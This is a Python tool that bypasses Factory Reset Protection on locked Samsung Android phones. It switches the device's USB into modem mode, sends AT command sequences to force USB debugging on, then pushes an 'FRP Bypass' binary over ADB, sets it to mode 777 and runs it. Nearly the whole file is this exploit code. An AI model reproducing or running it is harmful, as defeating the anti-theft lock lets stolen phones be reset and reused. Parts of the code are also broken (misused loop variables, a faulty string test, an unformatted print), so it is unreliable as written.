#! /bin/python3

from modules.banners import main_banner as banner
from click import echo, style, prompt 
from modules.adb_cmds import frp_bypass_cmds_1, frp_bypass_cmds_2
from modules.build_table import builder as build
from modules.devices_utils import list_devices
from modules.utils import is_device_found
from typing import List
import serial
import serial.tools.list_ports as prtlst
from serial.tools import list_ports_common
import time
import os
import sys
import subprocess
from subprocess import getoutput as get_data
import usb.core
from colorama import Fore

class AdbUtils:
    ''' ADB  exploit, 
        Upload frp bypass bin and run '''
    
    def adb_send(cmd: str):
        return subprocess.call(f"adb {cmd}",shell=True)
    
    def frp_bypass_method_1():
        cmds=frp_bypass_cmds_1
        for cmd in cmds:
            try:
                AdbUtils.adb_send(cmd)
                if cmd==cmds[0]:
                    echo(style("[*] Uplodading FRP Bypass bin to device ...",fg='bright_yellow'))
                elif cmd==cmds[1]:
                    echo(style("[*] Giving it 777 permissions ...",fg='red'))
                    time.sleep(0.5)
                    echo(style("[i] Executing the FRP Bypass binary ...",fg='bright_green'))
                elif cmd==cmds[2]:
                    return True
                else:
                    return False
            except Exception as e:
                print(f"{Fore.RED}[!] ERROR Occured: {Fore.RESET}{Fore.YELLOW}{e}")
        return True
    
    def frp_bypass_method_2():
        cmds=frp_bypass_cmds_2
        for cmd in range(len(cmds[0])):
            AdbUtils.adb_send(cmd)
        time.sleep(5)
        AdbUtils.adb_send(cmd[7])
        time.sleep(5)
        echo(style("[*] OK ...",fg='bright_green'))
        echo(style("[*] FRP Bypass Completed Successsfully !. Go to Back and Reset then Factory Reset",fg='bright_yellow'))
    

class SamsungFRPBypass():

    '''Samsung frpbypass utilities class. Tries to enable adb by swtiching device to mode mode then attempt frpbypass using adb.'''
    
    global VENDOR
    global PRODUCT
    global USB_MODEM_CONFIGURATION
    global PORT
    global dots
    
    PORT='/dev/ttyACM0'
    VENDOR = 0x04e8
    PRODUCT = 0x6860
    USB_MODEM_CONFIGURATION= 0x2
    dots =0
    
    def wait_print(text):
        global dots
        i = dots % 4
        sys.stdout.write("\r{}{}{}".format(text, "." * i, " " * (5 - i)))
        sys.stdout.flush()
        dots += 1
        time.sleep(0.5)

    def wait_usb(id_vendor, id_product):
        dev = None
        while dev == None:
            dev = usb.core.find(idVendor=id_vendor, idProduct=id_product)
            SamsungFRPBypass.wait_print(
                    f"{Fore.LIGHTYELLOW_EX}[*] Waiting for Samsung device connection over USB{Fore.RESET} "
                    )
        print(f"\t\t{Fore.GREEN}Device connected.{Fore.RESET}")
        return dev
    
    def get_usb_conf(usb_device):
        return usb_device.get_active_configuration().bConfigurationValue
    
    def switch_usb(usb_device):
        active_conf=SamsungFRPBypass.get_usb_conf(usb_device)
        if active_conf==2:
            echo(style("Device already into modem mode, skipping reset",fg='bright_yellow'))
        else:
            for _ in range(10):
                try:
                    usb_device.reset()
                    usb_device.reset()
                    usb_device.set_configuration(0x2)
                    active_conf=SamsungFRPBypass.get_usb_conf(usb_device)
                    if active_conf==2:
                        print(f"\t\t{Fore.GREEN}Device switched successfully to modem mode{Fore.RESET}")
                        break
                except Exception as e:
                    pass
        return True
    
    def wait_serial(port):
        found=False
        for _ in range(15):
            SamsungFRPBypass.wait_print(f"{Fore.LIGHTYELLOW_EX}[*] Check AT Serial port availabity{Fore.RESET} ")
            if os.path.exists(port):
                print(f"\t\t{Fore.GREEN}Sucess{Fore.RESET}")
                break
    
    def wait_switch_usb(port,id_vendor, id_product):
        if not os.path.exists(port):
            dev=SamsungFRPBypass.wait_usb(id_vendor, id_product)
            SamsungFRPBypass.switch_usb(dev)
            SamsungFRPBypass.wait_serial(port)
            return True
        else:
            echo(style("[*] Detected Sumsung Device",fg='green'))
            time.sleep(0.5)
            echo(style("[*] Serial already present, skipping USB config switch",fg='yellow'))
            return True
        return True
    
    def SamsungToModem():
        try:
            if SamsungFRPBypass.wait_switch_usb(PORT,VENDOR,PRODUCT):
                return True
            else:
                return False
        except Exception as e:
            print(f"{Fore.RED}ERROR:{Fore.RESET} {Fore.YELLOW}{e}")
            return False
        return True
        
class ATUtils:

    '''Class definied for Sending AT commands to frp locked samsung devices  swithed to modem mode.'''
    
    global SERIAL_BAUDRATE
    global SERIAL_TIMEOUT
    SERIAL_BAUDRATE = 115200
    SERIAL_TIMEOUT = 12
    
    def list_serial_ports() -> list_ports_common.ListPortInfo:
        ports= prtlst.comports()
        
        columns={
                "PORTS": "bright_green",
                "Serial Ports Informations":"bright_yellow",
                }
        rows,row={},{}
        
        for i, port in enumerate(ports):
            rows[str(i)]=str(port)
        if len(ports)== 0:
            row['N/A']="No Available Serial port"
            build(columns,row,error=row['N/A'],style='bright_cyan',end_s=False)
            exit(1)
        build(columns,rows,style='bright_cyan',end_s=False)
        return ports[-1]
    
    def get_at_serial(port : str) -> serial.Serial:
        timeout=12
        return serial.Serial(port, baudrate=SERIAL_BAUDRATE, timeout=timeout)

    def strip_cmd(text):
        return ":".join(text.split(":")[1:])
    
    def write_at_cmd(port,cmd,maxlines=5,timeout=12):
        at_cmd="AT+{}\r\n".format(cmd)
        with serial.Serial(port, timeout=timeout) as usbserial:
            usbserial.write(at_cmd.encode())
            time.sleep(0.7)
            res=usbserial.read_all().decode()
            return res.strip()

    def dump_devconinfo():
        try:
            for t in range(5):
                t+=1
                SamsungFRPBypass.wait_print(f"{Fore.LIGHTGREEN_EX}[*] Reading SUMSUMG device info{Fore.RESET} ")
                time.sleep(0.5) # for process info purpose 
            print("\n")
            DEVCONINFO="DEVCONINFO"
            formated=""
            devconinfo=ATUtils.write_at_cmd(PORT, DEVCONINFO,timeout=12)
            devconinfo=ATUtils.strip_cmd(devconinfo)
            devconinfo=devconinfo.split(";")
            for i in devconinfo:
                if not len(i.split("(")):
                    continue
                i=i.split("(")
                name=i[0].split()
                for n in name:
                    name=n
                val=i[1].replace(")","").split("\n")[0]
                print(f"{Fore.LIGHTYELLOW_EX}{name}{Fore.RESET} : {Fore.LIGHTWHITE_EX}{val}{Fore.RESET}")
                time.sleep(0.3)
        except IndexError:
            banner()
            return ATUtils.dump_devconinfo()
        except Exception as e:
            print(f"{Fore.RED}ERROR:{Fore.RESET} {Fore.YEllOW}{e}")
            return False
        return True
    
    def try_at_cmds(cmds: list):
        for i, cmd in enumerate(cmds):
            SamsungFRPBypass.wait_print(f"{Fore.GREEN} [*] Sending ADB exploit{Fore.RESET} {Fore.LIGHTWHITE_EX}{i}{Fore.RESET}")
            try:
                res=ATUtils.write_at_cmd(PORT,cmd,timeout=12)
                if ATUtils.check_adb_device():
                    break
                if 'OK' and 'Error:' in res:
                    print(f"\t{Fore.LIGHTYELLOW_EX}Exploit status:{Fore.RESET} {Fore.RED}Failed{Fore.RESET}")
                if 'Error:' in res and not 'OK' in res:
                    print(f"\t{Fore.LIGHTYELLOW_EX}Exploit status:{Fore.RESET} {Fore.RED}Failed{Fore.RESET}")
                if 'OK' in res and not 'Error:' in res:
                    print(f"\t{Fore.LIGHTYELLOW_EX}Exploit status:{Fore.RESET} {Fore.GREEN}ok{Fore.RESET}")
                if not 'OK' in res and not 'Error:' in res:
                    print(f"\t{Fore.LIGHTYELLOW_EX}Exploit status:{Fore.RESET} {Fore.GREEN}ok{Fore.RESET}")
            except Exception as e:
                print("\t{Fore.RED}[!] Error ocured while sending{Fore.RESET} {Fore.YELLOW}{cmd}{Fore.RESET}")
    
    def check_adb_device():
        try:
            device=get_data(f"adb devices -l|wc -l")
            if int(device)==2:
                return False
            else:
                is_device_found()
                return True
        except Exception as e:
            print(f"{Fore.RED}ERROR:{Fore.RESET} {Fore.YELLOW}{e}")
            return False
        return True
    
    def adb_exploit():
        print('-' * 65)
        echo(style("[*] Trying to enable USB Debugging ...",fg='bright_white'))
        print('-' * 65)
        time.sleep(0.5)
        try:
            cmds=[]
            cmds.append("DUMPCTRL=1,0")
            cmds.append("Reactive=1,0,0")
            cmds.append("DEBUGVLC=0,5")
            cmds.append("DDEXEAT+SWATD=0")
            cmds.append("ACTIVATE=0,0,0")
            cmds.append("ATDAT+SWATD=1")
            cmds.append("DEBUGVLC=0,5")
            ATUtils.try_at_cmds(cmds)
        except Exception as e:
            print(f"{Fore.RED}ERROR:{Fore.RESET} {Fore.YELLOW}{e}")
            return False
        return True
    
    def check_exploit_status():
        status=1
        try:
            for i in range(11):
                if not ATUtils.check_adb_device():
                    SamsungFRPBypass.wait_print(f"{Fore.GREEN}[*] Checking device connection. Please wait {Fore.RESET}")
                    status=1
                if ATUtils.check_adb_device():
                    print(f"\t{Fore.LIGHTGREEN_EX}Device connected successfully")
                    status=0
                    break
        except Exception as e:
            print(f"{Fore.RED}ERROR:{Fore.RESET} {Fore.YELLOW}{e}")
            return False
        if status==1:
            return False
        else:
            return True

